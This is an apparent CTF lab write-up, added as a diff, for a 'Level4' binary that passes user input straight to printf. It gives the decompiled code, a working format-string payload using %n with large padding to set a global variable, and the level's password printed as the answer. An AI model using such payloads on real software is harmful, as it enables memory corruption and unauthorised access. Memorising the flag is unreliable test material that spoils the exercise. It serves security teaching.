@@ -1,0 +1,101 @@
+# Level4 Walkthrough
+
+## Vulnerability Analysis
+
+This level demonstrates **advanced format string exploitation** with large value writes.
+
+### Source Code Analysis
+```c
+int m;
+
+void n(void) {
+  char local_20c [520];
+
+  fgets(local_20c,0x200,stdin);
+  p(local_20c);
+  if (m == 0x1025544) {
+    system("/bin/cat /home/user/level5/.pass");
+  }
+  return;
+}
+
+void p(char *param_1) {
+  printf(param_1);
+  return;
+}
+```
+
+### Key Vulnerabilities
+1. **Format String Bug**: `printf(param_1)` treats user input as format string
+2. **Large Value Check**: Program checks if `m == 0x1025544` (16930116 decimal)
+3. **Direct Output**: Uses `system("/bin/cat ...")` to display password
+
+## Exploitation Process
+
+### Step 1: Locate Target Variable
+```bash
+objdump -t ./level4 | grep " m$"
+# Output: 08049810 g     O .bss    00000004    m
+```
+Target address: `0x08049810`
+
+### Step 2: Find Stack Position
+```bash
+python -c "print('AAAA' + '%x '*20)" | ./level4
+# Look for 41414141 (AAAA) - appears at position 12
+```
+
+### Step 3: Calculate Large Value Write
+Target value: `0x1025544` = 16930116 decimal
+- Address bytes: 4
+- Required padding: 16930116 - 4 = 16930112 characters
+
+### Step 4: Execute Format String Exploit
+```bash
+(python -c "print('\x10\x98\x04\x08%16930112x%12\$n')"; cat) | ./level4
+```
+
+### Step 5: Extract Password
+The exploit outputs the password directly:
+`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
+
+## Technical Details
+
+### Attack Vector
+- **Type**: Format string vulnerability with large value write
+- **Method**: Memory write using `%n` specifier with massive padding
+- **Target**: Global variable `m` at `0x08049810`
+
+### Exploit Mechanics
+1. Place target address at beginning of input buffer
+2. Use `%16930112x` to print exactly 16930112 characters
+3. Total characters: 4 (address) + 16930112 (padding) = 16930116
+4. Use `%12$n` to write character count to address at 12th stack position
+5. Result: `m = 16930116` (0x1025544), condition satisfied
+
+### Format String Breakdown
+- `\x10\x98\x04\x08`: Target address (little-endian)
+- `%16930112x`: Print massive hex value for padding
+- `%12$n`: Write total character count to 12th parameter
+
+### Performance Considerations
+- Large padding values cause significant output
+- Exploit takes time due to massive character printing
+- Output contains ~16MB of whitespace before password
+
+## Security Implications
+
+### Advanced Format String Techniques
+- **Large Value Writes**: Demonstrates writing arbitrary large values
+- **Direct Information Disclosure**: Password displayed without shell access
+- **Precision Targeting**: Exact value matching for program flow control
+
+### Protection Mechanisms Bypassed
+- No format string validation
+- No bounds checking on printf output
+- Predictable memory layout
+
+## Result
+- **Flag**: `0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`
+- **Access Level**: Password displayed directly (no shell needed)
+- **Technique Learned**: Large value format string writes and direct output exploitation
